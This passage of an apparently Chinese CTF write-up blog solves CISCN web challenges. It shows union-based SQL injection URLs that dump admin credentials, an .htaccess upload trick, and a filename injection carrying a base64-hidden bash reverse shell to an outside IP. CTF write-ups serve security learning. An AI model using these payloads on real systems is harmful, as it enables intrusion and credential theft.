class="string">&#x27;secret&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> secret <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Tell me your secret. I will encrypt it so others can\&#x27;t see&#x27;</span></span><br><span class="line"></span><br><span class="line">rc = rc4_Modified.RC4(<span class="string">&quot;HereIsTreasure&quot;</span>)  <span class="comment"># 解密</span></span><br><span class="line">deS = rc.do_crypt(secret)</span><br><span class="line"></span><br><span class="line">a = render_template_string(safe(deS))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;ciscn&#x27;</span> <span class="keyword">in</span> a.lower():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;flag detected!&#x27;</span></span><br><span class="line"><span class="keyword">return</span> a</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>rc4_Modified.RC4.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">r = (self.Box[self.index_i] + self.Box[self.index_j]) % <span class="number">256</span></span><br><span class="line">R = self.Box[r]  <span class="comment"># 生成伪随机数</span></span><br><span class="line">tmp = <span class="built_in">ord</span>(s) ^ R</span><br><span class="line">test.append(tmp)</span><br><span class="line">out.append(<span class="built_in">chr</span>(tmp))</span><br><span class="line"><span class="comment"># print(test)</span></span><br><span class="line"><span class="comment"># print(len(test))</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(out)</span><br></pre></td></tr></table></figure><h2 id="CISCN-2023-西南-do-you-like-read"><a href="#CISCN-2023-西南-do-you-like-read" class="headerlink" title="[CISCN 2023 西南]do_you_like_read"></a>[CISCN 2023 西南]do_you_like_read</h2><p>进去就能找到一个注入点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28771/book.php?bookisbn=-1%27union%20select%20database(),2,3,4,5,6,7,8--+</span><br></pre></td></tr></table></figure><p>obs_db</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28771/book.php</span><br><span class="line">?bookisbn=-1&#x27;union select group_concat(table_name),2,3,4,5,6,7,8 from information_schema.tables where table_schema=&#x27;obs_db&#x27;--+</span><br></pre></td></tr></table></figure><p>admin,books,customers,order_items,orders,publisher</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28771/book.php</span><br><span class="line">?bookisbn=-1&#x27;union select group_concat(column_name),2,3,4,5,6,7,8 from information_schema.columns where table_name=&#x27;admin&#x27;--+</span><br></pre></td></tr></table></figure><p>name,pass</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28771/book.php</span><br><span class="line">?bookisbn=-1&#x27;union select group_concat(name,pass),2,3,4,5,6,7,8 from obs_db.admin--+</span><br></pre></td></tr></table></figure><p>adminf865b53623b121fd34ee5426c792e5c33af8c227</p><p>这里拿到了admin密码的哈希值</p><p>扔到解密网站跑一下, 直接出密码</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240313102458081.png" alt="image-20240313102458081"></p><p>登录上去可以看见是有上传点</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240313102719572.png" alt="image-20240313102719572"></p><p>尝试传一个php, 发现自动被改成了.jpg</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240313103055789.png" alt="image-20240313103055789"></p><p>尝试传.htaccess</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240313104133868.png" alt="image-20240313104133868"></p><p>访问之前被改了后缀的🐎</p><p>成功解析</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240313104212524.png" alt="image-20240313104212524"></p><p>看了下题解, 这好像是非预期</p><h2 id="CISCN-2019华北Day1-Web2"><a href="#CISCN-2019华北Day1-Web2" class="headerlink" title="[CISCN 2019华北Day1]Web2"></a>[CISCN 2019华北Day1]Web2</h2><h2 id="CISCN-2023-华北-pysym"><a href="#CISCN-2023-华北-pysym" class="headerlink" title="[CISCN 2023 华北]pysym"></a>[CISCN 2023 华北]pysym</h2><p>app.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, send_from_directory</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>]=<span class="string">&#x27;uploads&#x27;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">POST</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;No file uploaded.&#x27;</span></span><br><span class="line">    file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> file.content_length &gt; <span class="number">10240</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;file too lager&#x27;</span></span><br><span class="line">    path = <span class="string">&#x27;&#x27;</span>.join(random.choices(string.hexdigits, k=<span class="number">16</span>))</span><br><span class="line">    directory = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], path)</span><br><span class="line">    os.makedirs(directory, mode=<span class="number">0o755</span>, exist_ok=<span class="literal">True</span>)</span><br><span class="line">    savepath=os.path.join(directory, file.filename)</span><br><span class="line">    file.save(savepath)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">     os.system(<span class="string">&#x27;tar --absolute-names  -xvf &#123;&#125; -C &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(savepath,directory))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;something wrong in extracting&#x27;</span></span><br><span class="line"></span><br><span class="line">    links = []</span><br><span class="line">    <span class="keyword">for</span> root, dirs, files <span class="keyword">in</span> os.walk(directory):</span><br><span class="line">        <span class="keyword">for</span> name <span class="keyword">in</span> files:</span><br><span class="line">            extractedfile =os.path.join(root, name)</span><br><span class="line">            <span class="keyword">if</span> os.path.islink(extractedfile):</span><br><span class="line">                os.remove(extractedfile)</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;no symlink&#x27;</span></span><br><span class="line">            <span class="keyword">if</span>  os.path.isdir(path) :</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;no directory&#x27;</span></span><br><span class="line">            links.append(extractedfile)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>,links=links)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/uploads/&lt;path:path&gt;&quot;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>(<span class="params">path</span>):</span><br><span class="line">    filepath = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], path)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(filepath):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;404&#x27;</span>, <span class="number">404</span></span><br><span class="line">    <span class="keyword">return</span> send_from_directory(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], path)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">1337</span>)</span><br></pre></td></tr></table></figure><p>这里有一个很明显的命令注入, 用sleep测一下发现的确可以注入,</p><p>直接弹个shell回来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=&quot;a.tar;echo$&#123;IFS&#125;YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDcuMTQ4Ljc1LjIwMi8xMjM0IDA+JjE=|base64$&#123;IFS&#125;--decode|bash;&quot;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240313114927363.png" alt="image-20240313114927363"></p><h2 id="CISCN-2019华北Day1-Web1"><a href="#CISCN-2019华北Day1-Web1" class="headerlink" title="[CISCN 2019华北Day1]Web1"></a>[CISCN 2019华北Day1]Web1</h2><p>注册登录后有上传文件</p><p>在文件下载的地方存在任意文件读取</p><p>关键文件 class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$dbaddr</span> = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"><span class="variable">$dbuser</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbpass</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;dropbox&quot;</span>;</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$dbaddr</span>, <span class="variable">$dbuser</span>, <span class="variable">$dbpass</span>, <span class="variable">$dbname</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$db</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db = <span class="variable">$db</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">user_exist</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;s&quot;</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">store_result</span>();</span><br><span class="line">        <span class="variable">$count</span> = <span class="variable">$stmt</span>-&gt;num_rows;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$count</span> === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add_user</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">user_exist</span>(<span class="variable">$username</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$password</span> . <span class="string">&quot;SiAchGHmFx&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;ss&quot;</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">verify_user</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">user_exist</span>(<span class="variable">$username</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$password</span> . <span class="string">&quot;SiAchGHmFx&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT `password` FROM `users` WHERE `username` = ?;&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;s&quot;</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_result</span>(<span class="variable">$expect</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$expect</span>) &amp;&amp; <span class="variable">$expect</span> === <span class="variable">$password</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$results</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$funcs</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable">$filenames</span> = <span class="title function_ invoke__">scandir</span>(<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$key</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;.&quot;</span>, <span class="variable">$filenames</span>);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$filenames</span>[<span class="variable">$key</span>]);</span><br><span class="line">        <span class="variable">$key</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;..&quot;</span>, <span class="variable">$filenames</span>);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$filenames</span>[<span class="variable">$key</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$filenames</span> <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line">            <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$path</span> . <span class="variable">$filename</span>);</span><br><span class="line">            <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;files, <span class="variable">$file</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()] = <span class="keyword">array</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;funcs, <span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()][<span class="variable">$func</span>] = <span class="variable">$file</span>-&gt;<span class="variable">$func</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$table</span> = <span class="string">&#x27;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;thead&gt;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;funcs <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$func</span>) . <span class="string">&#x27;&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/thead&gt;&lt;tbody&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;results <span class="keyword">as</span> <span class="variable">$filename</span> =&gt; <span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$result</span> <span class="keyword">as</span> <span class="variable">$func</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">                <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$value</span>) . <span class="string">&#x27;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot; filename=&quot;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$filename</span>) . <span class="string">&#x27;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;下载&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;删除&lt;/a&gt;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/tr&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$table</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>) &amp;&amp; !<span class="title function_ invoke__">is_dir</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">name</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">basename</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">size</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$size</span> = <span class="title function_ invoke__">filesize</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        <span class="variable">$units</span> = <span class="keyword">array</span>(<span class="string">&#x27; B&#x27;</span>, <span class="string">&#x27; KB&#x27;</span>, <span class="string">&#x27; MB&#x27;</span>, <span class="string">&#x27; GB&#x27;</span>, <span class="string">&#x27; TB&#x27;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$size</span> &gt;= <span class="number">1024</span> &amp;&amp; <span class="variable">$i</span> &lt; <span class="number">4</span>; <span class="variable">$i</span>++) <span class="variable">$size</span> /= <span class="number">1024</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">round</span>(<span class="variable">$size</span>, <span class="number">2</span>).<span class="variable">$units</span>[<span class="variable">$i</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">detele</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>delete.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span 